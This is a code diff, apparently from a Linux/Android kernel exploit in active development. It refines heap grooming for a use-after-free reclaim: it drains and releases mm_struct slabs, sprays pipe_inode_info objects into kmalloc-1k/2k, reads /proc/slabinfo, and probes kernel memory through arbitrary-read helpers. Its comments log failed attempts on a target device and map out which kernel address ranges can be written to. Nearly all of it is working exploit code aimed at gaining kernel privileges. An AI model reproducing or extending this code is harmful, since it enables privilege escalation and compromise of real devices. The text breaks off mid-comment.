@@ -107,8 +107,97 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
   ctx->memfds = calloc(sizeof(int), cnt);
 }
 
+/* Grow/shrink a pipe's slot count. NON-FATAL on failure.
+ *
+ * This used to be SYSCHK(), i.e. any error aborted the caller. Measured on RFCWC0G1Z1J that is
+ * fatal to the entire reclaim: fcntl(F_SETPIPE_SZ, 32 * PAGE_SIZE) = 128 KB returns EPERM for
+ * our unprivileged shell user, so the pipe-prepare child died at
+ *   [!] SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE)): Operation not permitted
+ *   [-] pipe page child did not report base
+ * and prepare_pipe_buffer_page() reported no base at all. That is the true reason the reclaim
+ * kept coming back empty, and it is also why alloc_pipe_object() never managed to place a
+ * pipe_buffer ring into the reclaimed page: the ring was never resized, so the pipe_inode_info
+ * stayed at the default 16 slots.
+ *
+ * The resize is an optimisation, not a correctness requirement - the kernel default slot count
+ * still yields a real, live pipe_inode_info (16 slots ~= 840 bytes, a genuine kmalloc-1k
+ * allocation, which the cache gate accepts). So on failure just record it and carry on with the
+ * default, instead of taking the whole stage down. */
+/* Full per-cache view of /proc/slabinfo. Defined here because the mm_struct reclaim measurement
+ * inside prepare_pipe_buffer_page_child() needs it by value, so a bare forward declaration is not
+ * enough - the definition has to precede that use. The reader itself is further down. */
+struct rmg_slabinfo {
+  long active_objs;
+  long num_objs;
+  long objsize;
+  long objperslab;
+  long active_slabs;
+  long num_slabs;
+};
+
+static int slabinfo_read(const char *cache, struct rmg_slabinfo *out);
+static long slabinfo_active_slabs(const char *cache);
+static long wait_for_slab_drop(const char *cache, const struct rmg_slabinfo *before,
+                               long want_objs, int max_polls, int sleep_ms);
+
+/* Push a resource limit up to its hard limit, best effort.
+ *
+ * The reclaim bank needs two file descriptors per pipe. At PIPE_RECLAIM_SLABS=120 that is 3840
+ * fds, and on this device the payload's SOFT RLIMIT_NOFILE is far below the 32768 hard limit, so
+ * the bank died with 'SYSCHK(pipe(pipefd)): Too many open files' and the child aborted before it
+ * had allocated anything - which is why /proc/slabinfo showed active_slabs moving by only +6.
+ *
+ * The fork does exactly this in three places (05_mm_slab_grooming.c:763, :313,
+ * 09_pipe_buffer_rw.c:475) and our tree had no getrlimit/setrlimit call anywhere, which is the
+ * whole reason the larger bank could not be used. Best effort by design: if the hard limit is
+ * also too low we carry on with whatever we get, since a smaller bank still works, just less
+ * reliably. */
+static void raise_fd_limit_best_effort(void) {
+  struct rlimit rl;
+  if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
+    return;
+  }
+  if (rl.rlim_cur >= rl.rlim_max) {
+    rmg_diag("PIPE fd limit already at max cur=%llu\n",
+             (unsigned long long)rl.rlim_cur);
+    return;
+  }
+  struct rlimit want = rl;
+  want.rlim_cur = rl.rlim_max;
+  if (setrlimit(RLIMIT_NOFILE, &want) == 0) {
+    rmg_diag("PIPE raised fd limit %llu -> %llu\n", (unsigned long long)rl.rlim_cur,
+             (unsigned long long)want.rlim_cur);
+  } else {
+    rmg_diag("PIPE could not raise fd limit from %llu (max %llu)\n",
+             (unsigned long long)rl.rlim_cur, (unsigned long long)rl.rlim_max);
+  }
+}
+
 void resize_pipe_slots(int pipefd[2], size_t slots) {
-  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
+  if (fcntl(pipefd[0], F_SETPIPE_SZ, (long)(slots * PAGE_SIZE)) == 0) {
+    /* Count the successes, not just the failures.
+     *
+     * Until now only refusals were logged, which made the pipe soft limit look absolute. It is not
+     * necessarily so: fs/pipe.c:1354-1360 refuses only when
+     * too_many_pipe_buffers_soft(user_bufs) is true, and the soft budget is 16384 pages by
+     * default, i.e. about 1024 pipes at 16 slots each. Our bank of 640 plus 240 drain pipes is
+     * ~14080 pages, which is UNDER that - so a run where the resize SUCCEEDS is entirely possible
+     * and would mean the ring really can be 640 bytes of kmalloc-1k and the route is alive. If the
+     * success count stays at zero from the very first call, the budget was already exhausted before
+     * we started and the route is genuinely dead. This counter decides between the two, so log it
+     * rather than inferring. */
+    static unsigned long ok_count;
+    ok_count++;
+    if ((ok_count % 256) == 1) {
+      rmg_diag("PIPE F_SETPIPE_SZ slots=%zu OK (successes=%lu)\n", slots, ok_count);
+    }
+    return;
+  }
+  int saved = errno;
+  rmg_diag("PIPE F_SETPIPE_SZ slots=%zu bytes=%zu refused errno=%d; keeping kernel default\n",
+           slots, slots * PAGE_SIZE, saved);
+  pr_warning("pipe F_SETPIPE_SZ %zu slots refused errno=%d; using default slots\n", slots,
+             saved);
 }
 
 void make_pipe_object(int pipefd[2]) {
@@ -135,6 +224,23 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
+
+  /* Baseline for the whole staging sequence.
+   *
+   * The earlier attempt to measure this around cleanup_kernelsnitch() reported 'objs 1728->1728
+   * (drop 0)' because the mm_struct refs are released when the pre/post/spray children are killed
+   * and waitpid() returns - which happens well before cleanup_kernelsnitch() runs. So the window
+   * has to span the allocation AND the kills, not just the final cleanup.
+   *
+   * What we are looking for is the fork's acceptance criterion
+   * (05_mm_slab_grooming.c:739 exact_mm_reclaim): a release that drops exactly
+   * ORDER3_SIZE/MM_STRUCT_SZ objects and exactly one slab. mm_struct on this device is
+   *   mm_struct  768  768  1024  32  8 : tunables 0 0 0 : slabdata 24 24 0
+   * i.e. 32 objects per slab and, at rest, zero free objects - so a single fully-emptied slab is a
+   * clean, unambiguous signal. Until this number is visible we have no idea whether our grooming
+   * frees a whole slab or just churns. */
+  struct rmg_slabinfo mm_stage_before;
+  int have_stage = slabinfo_read("mm_struct", &mm_stage_before);
 
   for (size_t i = 0; i < prep.mm_cnt; i++) {
     prep.childs[i] = -1;
@@ -168,6 +274,21 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     kill_child(spray.childs[i]);
   }
   SYSCHK(waitpid(leak_child, NULL, 0));
+
+  /* What did the staging actually release? This is the number that decides whether the reclaim
+   * route can work at all: the fork needs a drop of exactly ORDER3_SIZE/MM_STRUCT_SZ objects and
+   * exactly one slab, and we have never measured ours. */
+  if (have_stage) {
+    struct rmg_slabinfo mm_stage_after;
+    if (slabinfo_read("mm_struct", &mm_stage_after)) {
+      rmg_diag("PIPE mm_struct stage: objs %ld->%ld (net %+ld)  slabs %ld->%ld (net %+ld)  "
+               "want a drop of %d objs / 1 slab\n",
+               mm_stage_before.num_objs, mm_stage_after.num_objs,
+               mm_stage_after.num_objs - mm_stage_before.num_objs, mm_stage_before.num_slabs,
+               mm_stage_after.num_slabs, mm_stage_after.num_slabs - mm_stage_before.num_slabs,
+               (int)(ORDER3_SIZE / MM_STRUCT_SZ));
+    }
+  }
 
   if (!kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
@@ -220,8 +341,58 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
-  run_kernelsnitch_bruteforce();
-  uintptr_t leaked = cleanup_kernelsnitch();
+  /* Reuse the mm group util.c already reclaimed instead of running a second KernelSnitch.
+   *
+   * The payload grooms the mm TWICE. util.c's collect_controlled_mm_group() runs first and
+   * spends 30-40 attempts finding a reclaimable mm group (logged 'controlled mm group attempt=39
+   * ...' then 'controlled mm group selected base=ffffff88222d0000'). Then this function runs
+   * its own run_kernelsnitch_bruteforce() + cleanup_kernelsnitch() to re-derive a base of the
+   * same kind. Measured consequence of the second pass: on RFCWC0G1Z1J it either returned a page
+   * whose pages were uniformly free or nothing at all - reclaim passes 2/4, 3/4 and 4/4 all
+   * logged 'leaked nothing'. The collision opportunity is consumed by the first groom, so the
+   * second one is not merely wasteful, it is actively harmful.
+   *
+   * CRITICAL: this must skip ONLY the ksnitch, never the pipe-object allocations that follow.
+   * An early return here was measured to leave the page completely untouched -
+   * 'cache18=0000000000000000' (slab_cache zero), type=ffffffff, cache10=dead000000000122,
+   * 64/64 match=0 - because the alloc_pipe_object() loop further down, which is what actually
+   * puts a pipe_buffer ring into the reclaimed page, never ran. So we set `leaked` instead of
+   * returning, and fall through to the rest of the function unchanged. The explicit ksnitch path
+   * is kept as a fallback for when util.c has not run or reclaimed nothing. */
+  uintptr_t leaked;
+  if (rmg_reclaimed_mm_base != 0) {
+    /* The mask at the end is `leaked & ~(ORDER3_SIZE - 1)`, so biasing to the top of the region
+     * makes it reproduce the exact base we were handed. */
+    leaked = (rmg_reclaimed_mm_base & ~(ORDER3_SIZE - 1)) | (ORDER3_SIZE - 1);
+    rmg_diag("PIPE reusing util.c reclaimed mm base=%016zx (skipping second ksnitch)\n",
+             rmg_reclaimed_mm_base);
+  } else {
+    run_kernelsnitch_bruteforce();
+    /* Measure the mm_struct cache either side of the release.
+     *
+     * The fork's verified reclaim (05_mm_slab_grooming.c:739 exact_mm_reclaim) only accepts a
+     * reclaim that drops EXACTLY ORDER3_SIZE / MM_STRUCT_SIZE objects and EXACTLY one slab, and
+     * mm_struct on this device is ideally shaped for that:
+     *     mm_struct  768  768  1024  32  8 : tunables 0 0 0 : slabdata 24 24 0
+     * Zero free objects (768 active == 768 total) and 32 objects per slab, so one more batch of
+     * 32 allocations must create exactly one new slab, and releasing it must return exactly that
+     * one slab. We have never checked whether our release actually does that - we only ever
+     * looked at whether a plausible-looking address came back. Log both sides so the next run
+     * answers it. */
+    struct rmg_slabinfo mm_before, mm_after;
+    int have_before = slabinfo_read("mm_struct", &mm_before);
+    leaked = cleanup_kernelsnitch();
+    if (have_before && slabinfo_read("mm_struct", &mm_after)) {
+      rmg_diag("PIPE mm_struct reclaim: objs %ld->%ld (drop %ld, want %d)  "
+               "slabs %ld->%ld (drop %ld, want 1)\n",
+               mm_before.num_objs, mm_after.num_objs,
+               mm_before.num_objs - mm_after.num_objs,
+               (int)(ORDER3_SIZE / MM_STRUCT_SZ), mm_before.num_slabs, mm_after.num_slabs,
+               mm_before.num_slabs - mm_after.num_slabs);
+    } else {
+      rmg_diag("PIPE mm_struct reclaim: slabinfo unavailable (readable=%d)\n", have_before);
+    }
+  }
   if (leaked == (uintptr_t)-1) {
     pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
     close_ctx_memfds(&prep);
@@ -236,6 +407,46 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+
+  /* RELEASE the staging now that the dangling pointer has been captured.
+   *
+   * This is the fix for the whole reclaim. clone_memfd() (util.c:1442) forks a child, opens
+   * /proc/<child>/mem and kills the child - but the returned fd still PINS that child's
+   * mm_struct, and we create 1279 of them per pass:
+   *     init_ctx(&prep,   32 * objs_per_slab)  = 1024
+   *     init_ctx(&spray, (1+MM_PARTIALS) * ..) =  192
+   *     init_ctx(&pre,    objs_per_slab - 1)   =   31
+   *     init_ctx(&post,   objs_per_slab)       =   32
+   * The close calls existed ONLY on the failure path (right below the leak-failure return), so on
+   * SUCCESS every one of those fds stayed open for the lifetime of the process. Measured
+   * consequence, reproducible across runs:
+   *     PIPE mm_struct stage:   objs 896->1920 (net +1024)  slabs 28->60 (net +32)
+   *     PIPE mm_struct reclaim: objs 1856->1856 (drop 0)     slabs 58->58 (drop 0)
+   *     gate: 240 x match=0
+   * No slab is ever emptied, so none is ever returned to the buddy, so the freed compound is never
+   * handed back and the pipe ring can never land on it. The fork requires exactly this release and
+   * verifies it (05_mm_slab_grooming.c:739 exact_mm_reclaim: object_drop == 32, slab_drop == 1);
+   * we produced a drop of zero, so that check would have rejected every attempt ever made.
+   *
+   * Order matters: the pointer is captured first, then the references are dropped - which is the
+   * whole trick, since the value stays valid in our hands while the kernel is free to reclaim the
+   * storage. */
+  close_ctx_memfds(&prep);
+  close_ctx_memfds(&spray);
+  close_ctx_memfds(&pre);
+  close_ctx_memfds(&post);
+  if (have_stage) {
+    struct rmg_slabinfo mm_released;
+    if (slabinfo_read("mm_struct", &mm_released)) {
+      long obj_drop = mm_stage_before.num_objs - mm_released.num_objs;
+      long slab_drop = mm_stage_before.num_slabs - mm_released.num_slabs;
+      rmg_diag("PIPE mm_struct RELEASED: objs %ld->%ld (drop %ld, want %d)  "
+               "slabs %ld->%ld (drop %ld, want 1)%s\n",
+               mm_stage_before.num_objs, mm_released.num_objs, obj_drop,
+               (int)(ORDER3_SIZE / MM_STRUCT_SZ), mm_stage_before.num_slabs, mm_released.num_slabs,
+               slab_drop, (obj_drop > 0 && slab_drop > 0) ? "  <-- SLAB RETURNED" : "");
+    }
+  }
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   if (getenv("KS_LEAK_ONLY")) {
     pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
@@ -245,6 +456,108 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
 #endif
 
+  /* Fresh, SINGLE-slab release immediately before the pipe bank.
+   *
+   * The bulk release above drops more than one slab (measured 64 objects / 2 slabs), which is
+   * enough pages but not a clean signal: the buddy holds thousands of free order-0 pages and has no
+   * reason to hand back the ones we just released, so our compound usually goes unused and the
+   * gate still reports match=0.
+   *
+   * mm_struct on this device rests at 768/768 - ZERO free objects - with 32 objects per slab. So
+   * pinning exactly 32 of them is guaranteed to create exactly one brand-new slab, and closing
+   * those 32 descriptors is guaranteed to return that one slab. That is exactly the fork's
+   * acceptance shape (05_mm_slab_grooming.c:739 demands slab_drop == 1) and it puts a single,
+   * unambiguous, freshly-freed order-3 compound at the head of the buddy's order-3 list right
+   * before we ask for order-0 pages, which is the best chance we have of the pipe ring landing in
+   * it. Best effort and bounded: if any clone fails we simply proceed with whatever we have. */
+  {
+    struct rmg_slabinfo one_before;
+    int have_one = slabinfo_read("mm_struct", &one_before);
+    /* DRAIN-TO-ZERO, THEN TAKE EXACTLY ONE SLAB.
+     *
+     * Six prior configurations all failed to empty a single slab, and the measurements say why.
+     * The decisive observation is that active_slabs == num_slabs in every sample: this cache has
+     * NO partial slabs, every slab is 100 percent active, which is consistent with mm_struct
+     * resting at 768 active / 768 total. When deficit (num_objs - active_objs) is 0, the very next
+     * 32 allocations MUST come from one brand-new slab, and closing those 32 MUST empty it. The
+     * previous attempts never reached deficit == 0, because earlier passes leaked objects and left
+     * deficit at 126-169, so the tail was drawn from scattered existing slabs and emptied none.
+     *
+     * So: phase 1 consumes the deficit and KEEPS those descriptors open, in a bounded loop, until
+     * the cache really reports zero free objects. Phase 2 pins exactly one slab's worth (32) -
+     * guaranteed fresh, since there is nothing left to hand out - and closes exactly those. Phase
+     * 3 is the caller building the pipe bank immediately afterwards, before anything else can
+     * allocate and take the pages we just released.
+     *
+     * This is the fork's acceptance shape at 05_mm_slab_grooming.c:739 (object_drop == 32,
+     * slab_drop == 1), reached in the only order in which it is actually reachable. */
+    const size_t k_one_slab = ORDER3_SIZE / MM_STRUCT_SZ; /* 32 */
+    const int k_drain_rounds = 8;
+    const size_t k_max_held = 4096;
+    int *held = calloc(k_max_held, sizeof(int));
+    size_t nheld = 0;
+    long drained_deficit = -1;
+
+    if (held) {
+      for (int round = 0; round < k_drain_rounds; round++) {
+        struct rmg_slabinfo s;
+        if (!slabinfo_read("mm_struct", &s)) {
+          break;
+        }
+        long def = s.num_objs - s.active_objs;
+        drained_deficit = def;
+        if (def <= 0) {
+          break; /* phase 1 complete: the cache has nothing left to hand out */
+        }
+        for (long i = 0; i < def && nheld < k_max_held; i++) {
+          int fd = clone_memfd();
+          if (fd < 0) {
+            break;
+          }
+          held[nheld++] = fd; /* deliberately NOT closed - see phase 1 */
+        }
+      }
+
+      /* Phase 2: the freelist is now empty, so these 32 come from one brand-new slab. */
+      int tail[k_one_slab];
+      size_t ntail = 0;
+      for (size_t i = 0; i < k_one_slab; i++) {
+        int fd = clone_memfd();
+        if (fd < 0) {
+          break;
+        }
+        tail[ntail++] = fd;
+      }
+      /* Phase 3 of the mechanism: free that slab immediately, before the pipe bank is built. */
+      for (size_t i = 0; i < ntail; i++) {
+        close(tail[i]);
+      }
+      /* The drain descriptors go too, so the process does not leak them. */
+      for (size_t i = 0; i < nheld; i++) {
+        close(held[i]);
+      }
+      free(held);
+    }
+
+    if (have_one) {
+      /* Poll rather than read once - see wait_for_slab_drop(). active_slabs is the meaningful
+       * column; num_slabs can stay flat because SLUB parks emptied slabs in the partial list. */
+      long drop = wait_for_slab_drop("mm_struct", &one_before, (long)k_one_slab, 40, 50);
+      struct rmg_slabinfo one_after;
+      int have_after = slabinfo_read("mm_struct", &one_after);
+      rmg_diag("PIPE one-slab release: drained_deficit=%ld | active_objs %ld->%ld (drop %ld) "
+               "| active_slabs %ld->%ld (drop %ld) | num_slabs %ld->%ld (drop %ld)%s\n",
+               drained_deficit, one_before.active_objs, one_after.active_objs,
+               one_before.active_objs - one_after.active_objs, one_before.active_slabs,
+               one_after.active_slabs, one_before.active_slabs - one_after.active_slabs,
+               one_before.num_slabs, one_after.num_slabs,
+               one_before.num_slabs - one_after.num_slabs,
+               (have_after && (one_before.active_slabs - one_after.active_slabs) >= 1)
+                   ? "  <-- SLAB EMPTIED"
+                   : (drop > 0 ? "  <-- observed drop" : "  <-- no slab emptied"));
+    }
+  }
+
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     alloc_pipe_object(pipe_fds_drain[i]);
   }
@@ -252,6 +565,49 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   pin_to_core(CORE);
   SYSCHK(close(skb_sv[0]));
   SYSCHK(close(skb_sv[1]));
+
+  /* DRAIN the kmalloc-1k/2k caches so the buddy is forced to hand out fresh pages.
+   *
+   * Why this is needed, measured rather than assumed. After the mm compound is freed, SLUB keeps
+   * serving new allocations from its own per-CPU PARTIAL lists: a slab only goes back to the buddy
+   * allocator when every object in it is free. kmalloc-2k alone has 672 slabs on this device, all
+   * non-empty (/proc/slabinfo: 'kmalloc-2k 10614 10752 2048 16 8 : slabdata 672 672 0'). So the
+   * 240 pipe_inode_info objects we are about to create are handed out of existing partial slabs,
+   * the buddy is never asked for pages, and none of the freed compound's pages are ever used -
+   * which is exactly the state the gate kept reporting: type=ffffffff,
+   * cache10=dead000000000122, 360 x match=0.
+   *
+   * Creating and immediately destroying pipes is itself a kmalloc-1k/2k drain: each pipe() takes a
+   * struct pipe_inode_info and each close() returns it. Running a few thousand of those empties
+   * whole slabs, returns them to the buddy, and makes the NEXT batch of pipe creations draw
+   * order-0 pages from the region we just reclaimed. This is the staging the fork performs with
+   * its prep/spray/pre/post mm_ctx groups; ours sprayed mm_struct-sized objects, which is the
+   * wrong cache entirely. Best-effort and bounded: a failure here costs throughput, not
+   * correctness, since the reclaim still gets its chance afterwards. */
+  /* Snapshot the kmalloc caches immediately before we build the reclaim bank.
+   *
+   * A 3000-iteration create/destroy drain used to live here on the theory that cycling pipes
+   * would empty whole slabs and return them to the buddy. Measured, that theory is false:
+   *   PIPE kmalloc drain pipes=3000 kmalloc-1k active_slabs 331 -> 331 kmalloc-2k 678 -> 678
+   * Zero slabs moved. The reason is that a slab is only returned when EVERY object in it is
+   * free, and these caches are nearly full (kmalloc-1k 340 free, kmalloc-2k 228 free), so
+   * transient pipes are simply absorbed into existing partial slabs.
+   *
+   * What actually forces slab growth is the SIZE OF THE BANK (see PIPE_RECLAIM_SLABS in
+   * common.h): the bank has to outnumber the cache's free objects so the buddy is finally asked
+   * for pages. So the drain is gone and all that is left here is the measurement, which is worth
+   * keeping because it makes the next run's arithmetic checkable. */
+  {
+    long free1k_objs = -1, free2k_objs = -1;
+    long act1k = slabinfo_active_slabs("kmalloc-1k");
+    long act2k = slabinfo_active_slabs("kmalloc-2k");
+    rmg_diag("PIPE pre-bank slabs kmalloc-1k active=%ld kmalloc-2k active=%ld "
+             "(bank=%d pipes must exceed the free-object count)\n",
+             act1k, act2k, (int)PIPE_RECLAIM);
+    (void)free1k_objs;
+    (void)free2k_objs;
+  }
+
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     alloc_pipe_object(pipe_fds_reclaim[i]);
   }
@@ -269,6 +625,9 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 }
 
 uintptr_t prepare_pipe_buffer_page(void) {
+  /* Raise the fd ceiling FIRST: the banks below need 2 fds per pipe, and at
+   * PIPE_RECLAIM_SLABS=120 that is 3840 of them. Without this the allocation dies with EMFILE. */
+  raise_fd_limit_best_effort();
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     make_pipe_object(pipe_fds_drain[i]);
   }
@@ -397,19 +756,276 @@ uintptr_t pipe_buf_ops_addr(void) {
   return text_addr(ANON_PIPE_BUF_OPS);
 }
 
+/* Read a cache's active slab count out of /proc/slabinfo.
+ *
+ * Line format (confirmed on RFCWC0G1Z1J):
+ *   kmalloc-2k  10614  10752  2048  16  8 : tunables 0 0 0 : slabdata 672 672 0
+ *   ^name       ^active ^total ^size ^per ^pp  ...            ^active_slabs ^total
+ * We locate the literal "slabdata" and take the token after it, which is robust to the
+ * tunables columns changing shape between kernels.
+ *
+ * Returns -1 if the file or the cache cannot be read. /proc/slabinfo IS readable by the shell
+ * user on this device, which is the same capability the fork relies on for its verified
+ * reclaim (05_mm_slab_grooming.c:683 read_reclaim_slabs, :739 exact_mm_reclaim). */
+/* Read a cache's counters out of /proc/slabinfo. Returns non-zero on success.
+ *
+ * This is the measurement the fork's verified reclaim is built on
+ * (05_mm_slab_grooming.c:683 read_reclaim_slabs, :739 exact_mm_reclaim). The file IS readable by
+ * the shell user on this device, which is what makes that technique available to us at all. */
+/* Wait for SLUB to actually hand an emptied slab back to the buddy allocator.
+ *
+ * Returning a slab is NOT synchronous with freeing its last object: SLUB flags the slab and pushes
+ * it onto a per-node reclaim list which a WORKQUEUE drains, so the /proc/slabinfo counters lag
+ * behind the close() by an unpredictable interval. That is why our measurements were erratic -
+ * the same code showed 'drop 64 / slabs 27->25' in one run and 'drop 0 / slabs 25->25' in the very
+ * next, with nothing changed in between. Reading slabinfo once after a close is a coin flip.
+ *
+ * This is precisely why the fork has wait_for_reclaim_quiet_window()
+ * (05_mm_slab_grooming.c:703), which samples TARGET_RECLAIM_QUIET_SAMPLE_MS = 25 ms apart and
+ * requires TARGET_RECLAIM_QUIET_STREAK = 3 consecutive equal samples before it will believe the
+ * numbers. Polling for the expected drop is the same idea, and is what makes the acceptance test
+ * meaningful rather than a race.
+ *
+ * Returns the observed slab drop, or 0 if it never appeared within the budget. */
+static long wait_for_slab_drop(const char *cache, const struct rmg_slabinfo *before,
+                               long want_objs, int max_polls, int sleep_ms) {
+  for (int i = 0; i < max_polls; i++) {
+    struct timespec ts;
+    ts.tv_sec = sleep_ms / 1000;
+    ts.tv_nsec = (long)(sleep_ms % 1000) * 1000000L;
+    while (nanosleep(&ts, &ts) != 0 && errno == EINTR) {
+    }
+    struct rmg_slabinfo now;
+    if (!slabinfo_read(cache, &now)) {
+      continue;
+    }
+    long obj_drop = before->num_objs - now.num_objs;
+    long slab_drop = before->num_slabs - now.num_slabs;
+    if (obj_drop >= want_objs && slab_drop >= 1) {
+      rmg_diag("PIPE slab drop observed after %d polls: objs drop=%ld (want %ld) "
+               "slabs drop=%ld\n", i + 1, obj_drop, want_objs, slab_drop);
+      return slab_drop;
+    }
+  }
+  return 0;
+}
+
+static int slabinfo_read(const char *cache, struct rmg_slabinfo *out) {
+  memset(out, 0, sizeof(*out));
+  FILE *fp = fopen("/proc/slabinfo", "r");
+  if (!fp) {
+    return 0;
+  }
+  char line[512];
+  int ok = 0;
+  while (fgets(line, sizeof(line), fp)) {
+    size_t n = strlen(cache);
+    if (strncmp(line, cache, n) != 0 || line[n] != ' ') {
+      continue;
+    }
+    long f[4] = {0, 0, 0, 0};
+    if (sscanf(line + n, "%ld %ld %ld %ld", &f[0], &f[1], &f[2], &f[3]) == 4) {
+      out->active_objs = f[0];
+      out->num_objs = f[1];
+      out->objsize = f[2];
+      out->objperslab = f[3];
+    }
+    char *p = strstr(line, "slabdata");
+    if (p) {
+      p += strlen("slabdata");
+      out->active_slabs = strtol(p, NULL, 10);
+      /* Skip to the NEXT number only. Skipping digits as well as spaces walks past num_slabs and
+       * lands on the trailing slabdata_active_objs, which silently reported 0 for every cache. */
+      while (*p == ' ' || *p == '\t') {
+        p++;
+      }
+      while (*p >= '0' && *p <= '9') {
+        p++;
+      }
+      while (*p == ' ' || *p == '\t') {
+        p++;
+      }
+      out->num_slabs = strtol(p, NULL, 10);
+      ok = 1;
+    }
+    break;
+  }
+  fclose(fp);
+  return ok;
+}
+
+static long slabinfo_active_slabs(const char *cache) {
+  struct rmg_slabinfo si;
+  if (!slabinfo_read(cache, &si)) {
+    return -1;
+  }
+  return si.active_slabs;
+}
+
 int pipe_cache_matches(uint64_t slab_cache) {
   if (slab_cache == 0) {
     return 0;
   }
-  if (KMALLOC_PIPE_INDEX == 10) {
-    return slab_cache == kmalloc_normal_1k_cache ||
-           slab_cache == kmalloc_cgroup_1k_cache;
+  /* Accept EITHER kmalloc bucket, not just the one KMALLOC_PIPE_INDEX names.
+   *
+   * KMALLOC_PIPE_INDEX is 11 (2k), but that assumed the ring is grown to 32 slots. F_SETPIPE_SZ
+   * is EPERM for our unprivileged shell user (measured: 'SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ,
+   * slots * PAGE_SIZE)): Operation not permitted'), so the pipes keep the kernel default of 16
+   * slots and a 16-slot struct pipe_inode_info is roughly 840 bytes - a kmalloc-1k object, not a
+   * kmalloc-2k one. Comparing only against the 2k cache therefore could never match anything we
+   * actually allocate. Accepting both is strictly more permissive and costs nothing: the
+   * structural check in pipe_cache_structural_match() already whitelists exactly 1024 and 2048. */
+  return slab_cache == kmalloc_normal_1k_cache ||
+         slab_cache == kmalloc_cgroup_1k_cache ||
+         slab_cache == kmalloc_normal_2k_cache ||
+         slab_cache == kmalloc_cgroup_2k_cache;
+}
+
+/* Structural fallback for pipe_cache_matches().
+ *
+ * The kmalloc_caches[] table read is measured to be partly unreliable on this device. One run
+ * logged `normal1k=0000000000000000` and `cgroup1k=fe03a414fe03a3bc`, neither of which is a
+ * plausible kernel pointer, while `normal2k=ffffff80011d2d80` was sane - so a table miss does
+ * not prove the page is the wrong kind, only that the name we compared against is junk. In that
+ * same run the page's own slab_cache (cache18) was ffffffff80011d2900, a perfectly valid
+ * kmem_cache, and the scan reported 88 x match=0 purely because the table entry was unusable.
+ *
+ * So when the table lookup misses, identify the cache from the struct the page itself points at:
+ * a real kmalloc bucket has size == object_size, and the two buckets that can hold a pipe buffer
+ * are 1024 and 2048 (target.h:545/546 give the field offsets). This is the same preference for
+ * structural validation over table comparison that the fork uses throughout
+ * (09_pipe_buffer_rw.c:1092 is_structural_pipe_candidate, 05_mm_slab_grooming.c:629
+ * validate_fops_object). Purely additive: the table check still runs first and still wins, so
+ * nothing that used to be accepted changes. */
+static int pipe_cache_structural_match(int fd, uint64_t slab_cache,
+                                        uint32_t page_type) {
+  /* Only probe a page that is actually in use.
+   *
+   * This check dereferences the kmem_cache the page points at, and on a FREE page that pointer
+   * is stale: the measured device behaviour is that reading through it does not fail with
+   * EFAULT, it HANGS, emitting 'RD target=...' with no matching 'RD pread ret=' line and killing
+   * the run at 123 diag lines. is_direct_ptr() does not help because a stale ffffffff80011d3xxx
+   * is a perfectly plausible direct address.
+   *
+   * page->page_type is 0 for a page that is in use and PAGEFLAGS_MASK (0xffffffff) for a free
+   * one, and the gate already reads it for pipe_page_type[] before this point - so use it as the
+   * precondition. Without this the structural probe turned a clean 'wrong kind of page' rejection
+   * into a hang, which is strictly worse than not probing at all. */
+  if (page_type != 0) {
+    return 0;
   }
-  if (KMALLOC_PIPE_INDEX == 11) {
-    return slab_cache == kmalloc_normal_2k_cache ||
-           slab_cache == kmalloc_cgroup_2k_cache;
+  if (!is_direct_ptr(slab_cache)) {
+    return 0;
   }
-  return slab_cache == kmalloc_pipe_cache;
+  uint64_t size = kernel_read64(fd, slab_cache + KMEM_CACHE_SIZE_OFF);
+  uint64_t objsz = kernel_read64(fd, slab_cache + KMEM_CACHE_OBJECT_SIZE_OFF);
+  if (size != objsz) {
+    return 0;
+  }
+  /* kmalloc-1k and kmalloc-2k are the only buckets a pipe_buffer ring can live in. */
+  if (size == 1024 || size == 2048) {
+    rmg_diag("PIPE cache STRUCTURAL match cache=%016zx size=%llu objsz=%llu\n",
+             slab_cache, (unsigned long long)size, (unsigned long long)objsz);
+    return 1;
+  }
+  return 0;
+}
+
+/* Bands measured UNWRITABLE on this firmware. A write into any of these never returns: the
+ * pwrite is planned cleanly and the machine reboots. Since that reboot is synchronous and takes
+ * the whole run with it, the gate must skip these pages WITHOUT attempting a store rather than
+ * discovering them one at a time.
+ *
+ * Evidence for each band (MEMORY sections 26/28/32/38/39):
+ *   0xffffff8001....  worker_pool / pool->worklist, boot kmalloc arena  - fatal
+ *   0xffffff805f....  percpu / vmalloc                                 - fatal
+ *   0xffffff8836....  same VMA family as the task_struct slab that hangs on READ - fatal
+ *   0xffffff8837....  task_struct slab                                  - fatal
+ * Confirmed WRITABLE (so the gate should keep looking there):
+ *   0xffffff8804.... 0xffffff880e....  and at least one 0xffffff8821.... page
+ * The 0xffffff8800..0xffffff882f range is therefore the band to try, and 0xffffff8830+ is not. */
+static int pipe_page_band_is_known_fatal(uintptr_t page) {
+  /* The old test compared `page >> 24` - the top 40 bits, 0xffffff80011d.. on
+   * every direct-map address - against 0x80/0x83, which no 64-bit address can
+   * ever satisfy, so the gate never skipped a single page and every probe was a
+   * blind store. The arena family is byte 4 (bits 32-39); the band inside the
